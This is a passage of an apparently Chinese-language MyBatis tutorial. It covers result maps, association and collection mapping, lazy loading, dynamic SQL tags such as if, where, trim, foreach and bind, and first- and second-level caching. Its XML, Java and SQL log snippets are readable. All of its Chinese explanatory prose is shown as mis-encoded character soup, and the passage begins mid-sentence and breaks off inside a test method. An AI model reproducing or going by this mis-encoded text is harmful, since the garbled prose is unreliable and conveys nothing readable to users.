0ï¼1ç´æ¥åå¼ã\n    * å½ååæ°ï¼ä½¿ç¨æ³¨è§£æ¹åå°å°è£mapçkeyï¼@Param("id")ï¼ç´æ¥ä½¿ç¨#{id}åå¼\n 3. å¦æå¤ä¸ªåæ°ï¼ä½¿ç¨pojoå¯¹è±¡ï¼#{}ä¼ épojoå¯¹è±¡å±æ§\n 4. ç´æ¥ä¼ å¥mapï¼#{key}ä¼ émapå¯¹è±¡å¯¹åºçkeyå¼ã\n 5. ç»å¸¸è¦ä½¿ç¨çå¤ä¸ªåæ°ï¼å¯ä»¥å°è£æTOå¯¹è±¡ã\n 6. å¦æä¼ éçæ¯Collection(Set List)ãæ°ç»ï¼ä¹ä¼è¿è¡ç¹æ®å°è£å°mapä¸­ï¼Listä½¿ç¨#{list[0]}ï¼æ°ç»ä½¿ç¨#{array[0]}\n\n\n\n\n# æ¥è¯¢ç»æè¿å\n\n * å¦æè¿åçæ¯ä¸ä¸ªéåï¼åresultTypeè¿åéåçæ³åã\n\n    <select id="selectAllEmp" resultType="employee">\n        select * from tbl_employee\n    </select>\n\n\n1\n2\n3\n\n * å¦æè¿åä¸ä¸ªmapï¼keyæ¯ååï¼valueæ¯å¼çåå®¹ï¼resultTypeåæ¯mapã\n\n    <select id="selectById" resultType="map">\n        select * from tbl_employee where id=#{id}\n    </select>\n\n\n1\n2\n3\n\n * å¦æè¿åä¸ä¸ªmapï¼keyæ¯ä¸»é®ï¼valueæ¯ææçæ¥è¯¢ç»æãresultTypeæ¯mapä¸­å°è£çç±»åï¼å¹¶ç»æ¹æ³å ä¸@MapKeyæ³¨è§£ï¼ææä¸»é®ã\n\n<select id="selectAll" resultType="employee">\nselect * from tbl_employee\n</select>\n\n\n1\n2\n3\n\n\n    @MapKey("id")\n    Map<Integer,Employee> selectAll();\n\n\n1\n2\n\n\n\n# å°è£è¿åç»æ\n\nå½æ°æ®åºåååæä»¬å®ä¹çjavaBeanå±æ§åä¸ä¸è´æ¶ï¼ä½¿ç¨resultTypeæå®è¿åå¼ç±»åå°ä¼å¯¼è´æ¥åºæ¥çæ°æ®æ æ³æ³¨å¥å°ç»æä¸­ãæä¸ç§è§£å³æ¹å¼ï¼\n\n * å¦ææ°æ®åºä¸­çåååjavabeanå±æ§åæ»¡è¶³é©¼å³°å½åæ³çè½¬æ¢ï¼åå¨mybatiséç½®æä»¶ä¸­å¼å¯é©¼å³°å½åæ³è½¬æ¢å³å¯\n * æ¥è¯¢æ°æ®åºè¯­å¥èµ·å«å\n * ä½¿ç¨resultMapå°è£è¿åç»æ\n\n<resultMap id="emp" type="com.pwddd.mybatis.bean.Employee">\n    <id property="id" column="id" />\n    <result property="lastName" column="last_name" />\n    <result property="gender" column="gender" />\n    <result property="email" column="email" />\n</resultMap>\n<select id="selectById" resultMap="emp">\n    select * from tbl_employee where id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# èåæ¥è¯¢çç»æè¿å\n\n# æ¹å¼ä¸ï¼ä½¿ç¨çº§èèµå¼æ¹å¼\n\n<resultMap id="empanddept" type="com.pwddd.mybatis.bean.Employee">\n    <id column="id" property="id" />\n    <result column="last_name" property="lastName" />\n    <result column="gender" property="gender" />\n    <result column="email" property="email" />\n    <result column="did" property="dept.did" />\n    <result column="dname" property="dept.dname" />\n</resultMap>\n\n<select id="selectEmpAndDeptById" resultMap="empanddept">\n    select *\n    from tbl_employee e , tbl_dept d\n    where e.did = d.did\n    and e.id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n# æ¹å¼äºï¼ä½¿ç¨associationèµå¼\n\n<resultMap id="empanddept" type="com.pwddd.mybatis.bean.Employee">\n    <id column="id" property="id" />\n    <result column="last_name" property="lastName" />\n    <result column="gender" property="gender" />\n    <result column="email" property="email" />\n    \x3c!--        <result column="did" property="dept.did" />--\x3e\n    \x3c!--        <result column="dname" property="dept.dname" />--\x3e\n    <association property="dept" javaType="com.pwddd.mybatis.bean.Dept">\n        <id column="did" property="did" />\n        <result column="dname" property="dname" />\n    </association>\n</resultMap>\n\n<select id="selectEmpAndDeptById" resultMap="empanddept">\n    select *\n    from tbl_employee e , tbl_dept d\n    where e.did = d.did\n    and e.id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# æ¹å¼ä¸ï¼åæ­¥æ¥è¯¢\n\n 1. æç§åå·¥IDæ¥åºåå·¥ä¿¡æ¯\n 2. æ ¹æ®æ¥è¯¢çåå·¥ä¿¡æ¯ä¸­çdid æ¥è¯¢å¯¹åºçdeptä¿¡æ¯\n 3. å°é¨é¨è®¾ç½®å°deptå±æ§ä¸­\n\n<resultMap id="step" type="com.pwddd.mybatis.bean.Employee">\n    <id column="id" property="id" />\n    <result column="last_name" property="lastName" />\n    <result column="gender" property="gender" />\n    <result column="email" property="email" />\n    <association property="dept" select="com.pwddd.mybatis.mapper.DeptMapper.selectById" column="did" >\n        <id column="did" property="did" />\n        <result column="dname" property="dname" />\n    </association>\n</resultMap>\n<select id="getEmpByIdStep" resultMap="step">\n    select * from tbl_employee where id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åºäºåæ­¥æ¥è¯¢çå»¶è¿å è½½åè½\n\nmybatiséç½®æä»¶ä¸­å¢å å¼å¯æå è½½éç½®ï¼\n\n<setting name="lazyLoadingEnabled" value="true"/>\n\x3c!--        æç§éè¦è¿è¡å±æ§çå è½½--\x3e\n<setting name="aggressiveLazyLoading" value="false"/>\n\n\n1\n2\n3\n\n\nåªä½¿ç¨employeeä¸­çå­æ®µæ¶ï¼å°±åªæ¥è¯¢ä¸æ¡SQLè¯­å¥\n\n@Test\npublic void testStep() throws IOException {\n    String resource = "mybatis-config.xml";\n    InputStream resourceAsStream = Resources.getResourceAsStream(resource);\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(resourceAsStream);\n    EmployeeMapperPlus mapper1 = sqlSessionFactory.openSession().getMapper(EmployeeMapperPlus.class);\n    Employee empByIdStep = mapper1.getEmpByIdStep(1);\n    System.out.println(empByIdStep.getEmail());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n[2022-02-20 20:23:29:798-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==>  Preparing: select * from tbl_employee where id = ?\n[2022-02-20 20:23:29:799-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==> Parameters: 1(Integer)\n[2022-02-20 20:23:29:841-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - &lt;==      Total: 1\nwangwu@qq.com\n\n\n1\n2\n3\n4\n\n\nå½æ¶ç¨å°deptä¸­æ¥è¯¢çå­æ®µæ¶åå è½½ç¬¬äºæ¡SQLè¯­å¥\n\n@Test\npublic void testStep() throws IOException {\n    String resource = "mybatis-config.xml";\n    InputStream resourceAsStream = Resources.getResourceAsStream(resource);\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(resourceAsStream);\n    EmployeeMapperPlus mapper1 = sqlSessionFactory.openSession().getMapper(EmployeeMapperPlus.class);\n    Employee empByIdStep = mapper1.getEmpByIdStep(1);\n    System.out.println(empByIdStep.getEmail());\n    System.out.println("============================================");\n    System.out.println(empByIdStep.getDept().getDid());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n[2022-02-20 20:26:02:673-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==>  Preparing: select * from tbl_employee where id = ?\n[2022-02-20 20:26:02:702-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==> Parameters: 1(Integer)\n[2022-02-20 20:26:02:748-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - &lt;==      Total: 1\nwangwu@qq.com\n============================================\n[2022-02-20 20:26:02:748-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==>  Preparing: select * from tbl_dept where did = ?\n[2022-02-20 20:26:02:749-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==> Parameters: 1(Integer)\n[2022-02-20 20:26:02:751-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - &lt;==      Total: 1\n1\n\nProcess finished with exit code 0\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# èåæ¥è¯¢çéåç»æè¿å\n\nä¸ä¸ªé¨é¨æå¤ä¸ªåå·¥ï¼æ¥è¯¢é¨é¨æ¶ï¼è¿åé¨é¨ä¸çææåå·¥ã\n\n# æ¹å¼ä¸ï¼å¤è¡¨èåæ¥è¯¢\n\n<resultMap id="depts" type="com.pwddd.mybatis.bean.Dept" >\n    <id column="did" property="did" />\n    <result column="dname" property="dname" />\n    \x3c!-- ofType å®ä¹éåä¸­çæ³åç±»å--\x3e\n    <collection property="employees" ofType="com.pwddd.mybatis.bean.Employee" >\n        <id column="id" property="id" />\n        <result column="last_name" property="lastName" />\n        <result column="email" property="email" />\n        <result column="gender" property="gender" />\n    </collection>\n\n</resultMap>\n<select id="getDeptById" resultMap="depts" >\n    select e.id,e.last_name,e.email,e.gender,d.did,d.dname\n    from tbl_employee e, tbl_dept d\n    where d.did = e.did\n    and e.did = #{did}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# æ¹å¼äºï¼åæ­¥æ¥è¯¢\n\n<resultMap id="deptsstep" type="com.pwddd.mybatis.bean.Dept" >\n    <id column="did" property="did" />\n    <result column="dname" property="dname" />\n    <collection property="employees" select="com.pwddd.mybatis.mapper.EmployeeMapperPlus.getEmpByDid"\n                ofType="com.pwddd.mybatis.bean.Employee" column="did" />\n</resultMap>\n\n<select id="getDeptByStep" resultMap="deptsstep" >\n    select * from tbl_dept where did = #{did}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# å¤åstepæ¥è¯¢\n\nå¦æéè¦åæ­¥æ¥è¯¢ï¼ç¬¬ä¸æ­¥æ¥è¯¢çç»æçå¤åä½ä¸ºç¬¬äºæ­¥æ¥è¯¢çæ¡ä»¶ï¼å¯ä»¥å°è£æmap\n\ncolumn="{did=did,dname=dname}"\n\n\n1\n\n\n\n# å³äºå»¶è¿å è½½\n\néå¯¹åæ­¥æ¥è¯¢å¯ä»¥åç¬è®¾ç½®æå è½½\n\n fetchType="eager" ä¸å¼å¯æå è½½\n  fetchType="lazy" å¼å¯æå è½½\n\n\n1\n2\n\n\n\n# é´å«å¨\n\né´å«å¨å¯ä»¥æ ¹æ®æ¡ä»¶è®¾ç½®æ¥è¯¢çç»æï¼æ¯å¦å¦ææ¯å¥³çæå°deptçç»æè¿åï¼å¦ææ¯ç·çï¼åå°lastnameçå¼èµå¼ç»emailçå¼ãè½ç¶æ²¡ææä¹ï¼åªç¨æ¥æµè¯ã\n\n<resultMap id="gete" type="com.pwddd.mybatis.bean.Employee" >\n<id column="id" property="id" />\n<result column="last_name" property="lastName" />\n<result column="gender" property="gender" />\n<result column="email" property="email" />\n<discriminator javaType="string" column="gender">\n<case value="0">\n<association property="dept" select="com.pwddd.mybatis.mapper.DeptMapper.selectById" column="did"/>\n</case>\n<case value="1">\n<result column="last_name" property="email" />\n</case>\n</discriminator>\n</resultMap>\n\n\n<select id="getE" resultMap="gete" >\nselect * from tbl_employee where id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# å¨æSQLè¯­å¥\n\nå¨æSQLè§£å³çæ¯æç§æ¡ä»¶æ¼è£SQLçé®é¢ãä½¿ç¨ä¸åçæ ç­¾ï¼mybatiså¯ä»¥æ ¹æ®ä¼ éçåæ°æ¡ä»¶å¨æçæ¼æ¥SQLè¯­å¥ã\n\n\n# ifæ ç­¾\n\nifæ ç­¾å¯ä»¥æ ¹æ®ä¼ å¥çåæ°å¤æ­æ¯å¦æ¼æ¥æ¥è¯¢æ¡ä»¶\n\n<select id="getEmpsByCondition" resultType="employee" >\n    select * from tbl_employee\n    where\n    <if test="id!=null" >\n        id = #{id}\n    </if>\n\n    <if test="lastName != null">\n        and last_name=#{lastName}\n    </if>\n\n    <if test="email != null">\n        and email = #{email}\n    </if>\n\n    <if test="gender != null">\n        and gender = #{gender}\n    </if>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# whereæ ç­¾\n\nè¿ç§æ¼æ¥æä¸ä¸ªé®é¢ï¼å°±æ¯å½idä¸å­å¨æ¶ï¼åé¢çè¯­å¥æ¼æ¥ä¼å¤ä¸ä¸ªandãå¸¸è§çè§£å³æ¹æ³æä¸¤ä¸ªï¼\n\n 1. where åé¢æ¼æ¥ä¸ä¸ª 1=1\n 2. ä½¿ç¨whereæ ç­¾ï¼å»é¤åç½®çand æè oræ¡ä»¶\n\nç¬¬ä¸ç§æ¹å¼ï¼\n<select id="getEmpsByCondition" resultType="employee" >\n    select * from tbl_employee\n    where 1=1\n    <if test="id!=null" >\n        and id = #{id}\n    </if>\n\n    ç¬¬äºç§æ¹å¼ï¼\n    <select id="getEmpsByCondition" resultType="employee" >\n        select * from tbl_employee\n        <where>\n            <if test="id!=null" >\n                id = #{id}\n            </if>\n\n            <if test="lastName != null">\n                and last_name=#{lastName}\n            </if>\n\n            <if test="email != null">\n                and email = #{email}\n            </if>\n\n            <if test="gender != null">\n                and gender = #{gender}\n            </if>\n        </where>\n    </select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\nä¸é¢çè¿ç§åæ³ï¼å¦æå¨æ¼æ¥æ¡ä»¶æ¶ï¼andåå¨æ¡ä»¶åé¢è¿ä¼åºé®é¢ï¼å ä¸ºwhereæ ç­¾åªä¼å é¤æç¬¬ä¸ä¸ªå¤ä½çandã\n\n<select id="getEmpsByCondition" resultType="employee" >\n    select * from tbl_employee\n    <where>\n        <if test="id!=null" >\n            id = #{id} and\n        </if>\n\n        <if test="lastName != null">\n            last_name=#{lastName} and\n        </if>\n\n        <if test="email != null">\n            email = #{email} and\n        </if>\n\n        <if test="gender != null">\n            gender = #{gender}\n        </if>\n    </where>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# trimæ ç­¾\n\nä½¿ç¨trimæ ç­¾ï¼å¯ä»¥è§£å³ä¸è¿°é®é¢ï¼trimæ ç­¾æå¦ä¸çå±æ§ï¼\n\n * prefix : ç»è¯­å¥å ä¸ä¸ä¸ªåç¼\n * prefixOverides : è¦çæåç¼çå­ç¬¦ä¸²\n * suffix : ç»è¯­å¥å ä¸ä¸ä¸ªåç¼\n * suffixOverrides : è¦çæåç¼çå­ç¬¦ä¸²\n\nä¸è¿°çæ¥è¯¢å¯ä»¥æ¹æå¦ä¸åå®¹ï¼\n\n<select id="getEmpsByCondition" resultType="employee" >\n    select * from tbl_employee\n    <trim prefix="where" suffixOverrides="and">        \n        <if test="id!=null" >\n            id = #{id} and\n        </if>\n\n        <if test="lastName != null">\n            last_name=#{lastName} and\n        </if>\n\n        <if test="email != null">\n            email = #{email} and\n        </if>\n\n        <if test="gender != null">\n            gender = #{gender}\n        </if>\n    </trim>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# chooseæ ç­¾\n\nchooseæ ç­¾ç±»ä¼¼äºjavaä¸­çswitch-caseè¯­å¥ã\n\n<select id="getEmpsByCOnditionChoose" resultType="employee">\n    select * from tbl_employee\n    <where>\n        <choose>\n            <when test="id!=null">\n                id = #{id}\n            </when>\n\n            <when test="lastName != null">\n                and last_name = #{lastName}\n            </when>\n\n            <otherwise>\n                and gender = 1\n            </otherwise>\n        </choose>\n    </where>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# setæ ç­¾\n\nwhereæ ç­¾ä¸­å°è£çæ¯æ¥è¯¢çæ¡ä»¶ï¼èsetæ ç­¾ä¸­å°è£çæ¯æ´æ°æ¡ä»¶ã\n\nå¦ææä»¬ä¸ä½¿ç¨setæ ç­¾ï¼èä½¿ç¨ifæ ç­¾æ¼æ¥updateè¯­å¥çsetæ¡ä»¶çè¯ï¼åä¼å¯¼è´åé¢å¤ä¸ä¸ªéå·ï¼SQLæ§è¡æ¥éã\n\n<update id="updateEmp">\n    update tbl_employee\n    set\n    <if test="lastName != null">\n        last_name = #{lastName},\n    </if>\n    <if test="gender != null">\n        gender = #{gender},\n    </if>\n    <if test="email != null" >\n        email = #{email}\n    </if>\n\n    where id = #{id}\n</update>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n[2022-02-21 14:33:36:972-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==>  Preparing: update tbl_employee set last_name = ?, where id = ?\n[2022-02-21 14:33:36:997-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==> Parameters: lisi(String), 1(Integer)\n\n\n1\n2\n\n\nä½¿ç¨setæ ç­¾å¯ä»¥å»é¤åé¢å¤ä½çéå·ã\n\n<update id="updateEmp">\n    update tbl_employee\n    <set>\n        <if test="lastName != null">\n            last_name = #{lastName},\n        </if>\n        <if test="gender != null">\n            gender = #{gender},\n        </if>\n        <if test="email != null" >\n            email = #{email}\n        </if>\n    </set>\n    where id = #{id}\n</update>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# foreachæ ç­¾\n\nforeachæ ç­¾ç¨æ¥éåä¼ éè¿æ¥çlistæèmapï¼å¸¸ç¨æ¥åinæ¥è¯¢æèæ¹éæ°å¢ã\n\nforeachæ ç­¾æå¦ä¸çå±æ§å¯ä»¥éæ©ï¼\n\n * collection: ä¼ è¿æ¥çéååæ°\n * item: éååºæ¥çåä¸ªå¼\n * open: foreachæ¼æ¥çå¼å§ç¬¦å·\n * close: foreachæ¼æ¥çç»æç¬¦å·\n * separator: åç´ ä¹é´çåéç¬¦\n * index: å¯¹äºlistæ¥è¯´ï¼indexæ¯ç´¢å¼ï¼itemæ¯valueï¼å¯¹äºmapèè¨ï¼indexæ¯keyï¼itemæ¯value\n\nINæ¥è¯¢employee\n\n<select id="getEmpsByIn" resultType="employee">\n    select * from tbl_employee\n    where id in\n    <foreach collection="list" item="id" open="(" separator="," close=")">\n        #{id}\n    </foreach>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\ninsertæ¹éæå¥æ°æ®\n\n<insert id="addEmps" >\n    insert into tbl_employee(id,last_name,gender,email)\n    values\n    <foreach collection="collection"  separator="," item="emp">\n        (#{emp.id},#{emp.lastName},#{emp.gender},#{emp.email})\n    </foreach>\n</insert>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nç¬¬äºç§æ¹å¼éè¦æ°æ®åºå¼å¯å¯ä»¥æ¹éæäº¤\n\njdbc.url=jdbc:mysql://localhost:3306/mybatis?allowMultiQueries=true\n\n\n1\n\n\n<insert id="addEmps" >\n    <foreach collection="list" item="emp" separator=";" >\n        insert into tbl_employee(id,last_name,gender,email)\n        values (#{emp.id},#{emp.lastName},#{emp.gender},#{emp.email})\n    </foreach>\n</insert>\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# ä¸¤ä¸ªåç½®åæ°\n\nmybatisä¸­æä¸¤ä¸ªåç½®åæ°å¯ä»¥ç¨æ¥åå¼ã\n\n * _parameter: ä»£è¡¨æ´ä¸ªåæ°ï¼å¦æä¼ éå¤ä¸ªåæ°ï¼åæ°ä¼è¢«å°è£æä¸ä¸ªmap _parameterå°±ä»£è¡¨è¿ä¸ªmap\n * _databaseId: å¦æéç½®äºdatabaseIdProvideræ ç­¾ï¼åè¯¥å¼å°±ä»£è¡¨æä»¬éç½®çå¼ã\n\næ å­ï¼\n\n<select id="getDept" resultType="dept" >\n    <if test="_databaseId=mysql">\n        select * from tbl_dept where did = #{did}\n    </if>\n</select>\n\n\n1\n2\n3\n4\n5\n\n\n\n# bindæ ç­¾\n\nbindæ ç­¾å¯ä»¥å°OGNLè¡¨è¾¾å¼ç»å®å°ä¸ä¸ªåéä¸ãæä»¬å¯ä»¥ä½¿ç¨å¦ä¸çæ¹å¼è¿è¡æ¨¡ç³æ¥è¯¢\n\nSystem.out.println(mapper.getLikeEmp("%a%"));\n\n\n1\n\n\næä»¬ä¹å¯ä»¥å°%æ¾å°sqlè¯­å¥ä¸­ï¼ä½ä¸è½ä½¿ç¨ä¸é¢çæ¹å¼ï¼\n\nselect * from tbl_employee\nwhere last_name like "%#{lastName}%"  -- likeåé¢çæ¥è¯¢æ¡ä»¶åºè¯¥æ¯ä¸ä¸ªæ´ä½\nselect * from tbl_employee\nwhere last_name like "%${lastName}%"  -- æ¼æ¥ä¸å®å¨\n\n\n1\n2\n3\n4\n\n\næä»¬å¯ä»¥ä½¿ç¨bindå°æ¼æ¥è¿è¡ç»å®\n\n<select id="getLikeEmp" resultType="employee">\n    <bind name="_lastName" value="\'%\'+lastName+\'%\'"/>\n    select * from tbl_employee\n    where last_name like #{_lastName}\n</select>\n\n\n1\n2\n3\n4\n5\n\n\n\n# sqlæ ç­¾\n\nsqlæ ç­¾å¯ä»¥å°å¤æ¬¡çæ¥è¯¢è¯­å¥è¿è¡ä¿å­ï¼ä¸æ¬¡ä½¿ç¨ç´æ¥å¼ç¨ãå¯ä»¥ä½¿ç¨inclueè¿è¡å¼ç¨ã\n\n\n<sql id="emp">\n    id,last_name,email,gender\n</sql>\n\n<select id="getLikeEmp" resultType="employee">\n    <bind name="_lastName" value="\'%\'+lastName+\'%\'"/>\n    select \n    <include refid="emp" />\n    from tbl_employee\n    where last_name like #{_lastName}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\ninclueæ ç­¾åå¯ä»¥èªå®ä¹ä¸äºå±æ§ï¼ç¶åä½¿ç¨${}åå¼ã\n\n<sql id="emp">\n    id,${name},email,gender\n</sql>\n\n<select id="getLikeEmp" resultType="employee">\n    <bind name="_lastName" value="\'%\'+lastName+\'%\'"/>\n    select\n    <include refid="emp" >\n        <property name="name" value="last_name"/>\n    </include>\n    from tbl_employee\n    where last_name like #{_lastName}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# ç¼å­\n\nMybatisä¸­åå«äºä¸ä¸ªéå¸¸å¼ºå¤§çæ¥è¯¢ç¼å­ç¹æ§ï¼å¯ä»¥éå¸¸æ¹ä¾¿çéç½®åå®å¶ãç¼å­å¯ä»¥æå¤§çæåæ¥è¯¢æçã\n\nMyBatisç³»ç»ä¸­é»è®¤å®ä¹äºä¸¤çº§ç¼å­ãä¸çº§ç¼å­ï¼äºçº§ç¼å­ã\n\n 1. é»è®¤æåµä¸ï¼åªæä¸çº§ç¼å­ï¼SQLSessionçº§å«çç¼å­ï¼æ¬å°ç¼å­ï¼å¼å¯ã\n 2. äºçº§ç¼å­éè¦æå¨éç½®ï¼æ¯namespaceçº§å«çç¼å­\n 3. ä¸ºäºæé«æ©å±æ§ãMybatiså®ä¹äºç¼å­æ¥å£Cacheï¼æä»¬å¯ä»¥å®ç°Cacheæ¥å£å®ç°å®ä¹äºçº§ç¼å­ã\n\n\n# ä¸çº§ç¼å­\n\nä¸æ°æ®åºåä¸æ¬¡ä¼è¯äº§ççæ°æ®ä¼æ¾å°ä¸çº§ç¼å­ä¸­ï¼ä»¥åå¦æéè¦åç¸åçæ°æ®åç´æ¥ä»ç¼å­ä¸­åã\n\n@Test\npublic void testFirstLevel() throws IOException {\n    String resource = "mybatis-config.xml";\n    InputStream resourceAsStream = Resources.getResourceAsStream(resource);\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(resourceAsStream);\n    SqlSession sqlSession = sqlSessionFactory.openSession();\n\n    try {\n        EmployeeMapperCache mapper = sqlSession.getMapper(EmployeeMapperCache.class);\n        System.out.println(mapper.getEmp(1));\n        System.out.println(mapper.getEmp(1));\n    }finally {\n        sqlSession.close();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\næ¥è¯¢ç»æå¯ä»¥çåºï¼åªæ§è¡äºä¸æ¬¡æ¥è¯¢\n\n[2022-02-21 19:26:09:969-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==>  Preparing: select * from tbl_employee where id = ?\n[2022-02-21 19:26:09:994-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==> Parameters: 1(Integer)\n[2022-02-21 19:26:10:011-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - &lt;==      Total: 1\nEmployee{id=1, lastName=\'wangwu\', gender=0, email=\'wangwu@qq.com\', dept=null}\nEmployee{id=1, lastName=\'wangwu\', gender=0, email=\'wangwu@qq.com\', dept=null}\n\n\n1\n2\n3\n4\n5\n\n\næä»¥ä¸å ç§æåµå¯¼è´ç¼å­å¤±æï¼\n\n * ä¸åçsqlSession\n * SQLSessionç¸åï¼æ¥è¯¢æ¡ä»¶ä¸å - ç¼å­ä¸­æ²¡æ\n * SQLSessionç¸åï¼ä¸¤æ¬¡æ¥è¯¢ä¹é´æå¢å æ¹æ¥æä½\n * SQLSessionç¸åï¼è°ç¨ç¼å­æ¸ç©ºsqlsesson.clearCache()\n\n\n# äºçº§ç¼å­\n\nä¸åçSqlSessionæ æ³ä½¿ç¨ä¸çº§ç¼å­ï¼èå´è¾å°ãå½æä»¬éè¦ä¸åçSqlSessionå¯ä»¥ä»ç¼å­ä¸­æ¥æ¾æ°æ®ï¼åéè¦å¼å¯äºçº§ç¼å­ãäºçº§ç¼å­çä½ç¨åæ¯namespaceã\n\näºçº§ç¼å­æºå¶ï¼\n\n 1. ä¸ä¸ªä¼è¯ï¼æ¥è¯¢ä¸æ¡è¯­å¥ï¼è¿ä¸ªæ°æ®ä¼è¢«å­å¨å¨ä¸çº§ç¼å­ä¸­ã\n 2. ä¼è¯å³é­ï¼ä¸çº§ç¼å­ä¸­çæ°æ®ä¼è¢«ä¿å­å°äºçº§ç¼å­ä¸­ï¼æ°çæ¥è¯¢ä¼è®¿é®äºçº§ç¼å­ã\n 3. ä¸åçnamespaceæ¥è¯¢çæ°æ®ä¼å¯¹åºèªå·±çç¼å­ç©ºé´ã\n\nä½¿ç¨æ¹æ³ï¼\n\n 1. å¼å¯å¨å±äºçº§ç¼å­éç½®\n\n<setting name="cacheEnabled" value="true"/>\n\n\n1\n\n 2. å»mapperä¸­éç½®äºçº§ç¼å­\n\n<cache></cache>\n\n\n1\n\n\näºçº§ç¼å­éç½®æä»¥ä¸å¯éåæ°ï¼\n\n * blocking:\n * eviction: ç¼å­çåæ¶ç­ç¥\n   * LRU: æè¿æå°ä½¿ç¨çï¼ç§»é¤é¿æ¶é´æªè¢«è®¿é®çå¯¹è±¡\n   * FIFO: åè¿ååºï¼æç§å¯¹è±¡å­å¨çé¡ºåºï¼åè¿æ¥çååºå»\n   * SOFT: è½¯å¼ç¨ï¼ç§»é¤åºäºåå¾åæ¶å¨ç¶æåè½¯å¼ç¨çå¯¹è±¡\n   * WEAK: å¼±å¼ç¨ï¼æ´ç§¯æçç§»é¤åºäºåå¾æ¶éå¨ç¶æåå¼±å¼ç¨çç¸å³å¯¹è±¡\n   * é»è®¤ï¼LRU\n * flushIntervalï¼ç¼å­å·æ°æ¶é´ï¼é»è®¤ä¸æ¸ç©º\n * readOnly\n   * trueï¼ åªè¯»ï¼mybatisè®¤ä¸ºææç¼å­ä¸­çæ°æ®é½æ¯åªè¯»æä½ï¼ä¸ä¼ä¿®æ¹æ°æ®ãä¸ºäºå å¿«éåº¦ï¼ä¼å°ç¼å­ä¸­çåå®¹ç´æ¥äº¤ç»ç¨æ·ï¼ä¸å®å¨éåº¦å¿«ã\n   * falseï¼ éåªè¯»ï¼mybatisè§å¾æ°æ®æ¯å¯ä»¥è¢«ä¿®æ¹çãmybatisä¼å©ç¨åºååç­ææ¯åéä¸ä»½æ°çæ°æ®ç»ä½ ã\n * sizeï¼ç¼å­å¤å°æ°æ®\n * typeï¼æå®ç¼å­çå¨ç±»å\n\n 3. pojoå®ç°åºååæ¥å£\n\n@Test\npublic void testSecondLevel() throws IOException {\n    String resource = "mybatis-config.xml";\n    InputStream resourceAsStream = Resources.getResourceAsStream(resource);\n    SqlSessionFactory sqlSessionFactory 